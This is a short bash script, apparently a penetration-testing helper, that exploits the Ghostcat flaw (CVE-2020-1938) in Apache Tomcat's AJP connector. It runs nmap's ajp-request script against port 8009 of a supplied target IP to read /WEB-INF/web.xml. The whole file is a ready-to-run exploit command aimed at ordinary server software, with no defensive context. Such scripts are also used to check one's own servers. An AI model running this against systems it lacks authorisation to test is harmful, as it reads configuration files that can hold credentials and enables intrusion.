#!/bin/bash
# AJP Ghostcat 文件读取 (CVE-2020-1938)
# Usage: tomcat_ghostcat.sh <TARGET_IP>
set -euo pipefail

TARGET_IP="${1:-127.0.0.1}"

nmap -p 8009 --script ajp-request --script-args ajp-request.path=/WEB-INF/web.xml "$TARGET_IP" 2>/dev/null
